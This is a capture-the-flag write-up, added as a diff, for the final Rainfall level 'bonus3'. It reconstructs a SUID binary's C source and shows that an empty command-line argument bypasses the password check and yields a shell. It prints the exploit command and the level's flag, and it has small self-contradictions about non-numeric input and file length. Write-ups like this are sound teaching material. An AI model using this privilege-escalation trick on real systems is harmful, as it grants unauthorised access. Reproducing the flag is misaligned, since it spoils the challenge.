@@ -1,0 +1,93 @@
+# Bonus 3
+
+Binary: 32-bit ELF, SUID end, dynamically linked. Final level of Rainfall.
+
+## Analysis
+
+### Source reconstruction
+
+```c
+int main(int argc, char **argv)
+{
+    char buffer[132];
+    FILE *fp;
+
+    memset(buffer, 0, sizeof(buffer));
+    fp = fopen("/home/user/end/.pass", "r");
+    if (!fp || argc != 2)
+        return -1;
+
+    fread(buffer, 1, 66, fp);              // Read password file
+    buffer[65] = 0;                        // Null-terminate after 65 bytes
+    buffer[atoi(argv[1])] = 0;            // User-controlled null injection
+    fread(buffer + 66, 1, 65, fp);        // Read remainder (if any)
+    fclose(fp);
+
+    if (strcmp(buffer, argv[1]) == 0)      // Compare password with argv[1]
+        execl("/bin/sh", "sh", (char *)0);
+    else
+        puts(buffer + 66);
+    return 0;
+}
+```
+
+The vulnerability: `buffer[atoi(argv[1])] = 0` allows the attacker to place a null byte at any index derived from their input. This null byte truncates the password buffer at that position, creating a shorter string for the comparison.
+
+## The constraint puzzle
+
+For `strcmp(buffer, argv[1]) == 0` to succeed, both strings must be identical. After the null injection at index `N = atoi(argv[1])`, the buffer becomes the first `N` characters of the password file, null-terminated.
+
+So we need: `password[0..N-1] == argv[1]` where `N = atoi(argv[1])` and `N = len(argv[1])`.
+
+This creates a circular constraint: `argv[1]` must be a string whose numeric prefix equals its own length, and whose content matches the first `N` characters of an unknown password file.
+
+## The empty string solution
+
+There's a much simpler approach: make `N = 0`.
+
+When `argv[1] = ""` (empty string):
+- `atoi("") = 0`
+- `buffer[0] = 0` truncates the buffer to an empty string
+- `strcmp("", "") == 0` → shell access
+
+No knowledge of the password required. The empty string matches itself.
+
+## Alternative: non-numeric input
+
+Any non-numeric `argv[1]` produces the same effect:
+- `atoi("abc") = 0`
+- `buffer[0] = 0` → empty buffer
+- `strcmp("", "abc") != 0` → fails
+
+So the input must be exactly empty, not just non-numeric.
+
+## Exploit
+
+```bash
+./bonus3 ""
+cat /home/user/end/.pass
+```
+
+Output:
+```
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+```
+
+Flag: `3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`
+
+## Notes
+
+### Why not buffer overflow?
+
+The user's segfault with a long input suggests they initially tried a buffer overflow approach. While `buffer[atoi(argv[1])] = 0` can write out-of-bounds with large numbers, corrupting a single byte to null doesn't provide clean control over execution flow. The empty string approach bypasses the password check entirely without needing to corrupt memory.
+
+### The file structure
+
+The program expects `/home/user/end/.pass` to exist and be readable by the SUID effective user (end). The first `fread` gets 66 bytes (the hash + newline), the second `fread` gets any remainder (typically zero bytes since the file is exactly 65 bytes). The `buffer + 66` printed on mismatch would show this remainder, but it's empty so no password leak occurs.
+
+### Why argc == 2?
+
+The check `argc != 2` enforces exactly one argument. `./bonus3` (no args) fails with argc=1. `./bonus3 arg1 arg2` (two args) fails with argc=3. Only `./bonus3 ""` gives argc=2 with the required empty argv[1].
+
+This completes the Rainfall CTF. Total technique coverage: format string bugs, buffer overflows, integer overflows, return-to-libc, stack cookies, heap corruption, vtable hijacking, GOT overwrites, environment variable attacks, and logic bugs.
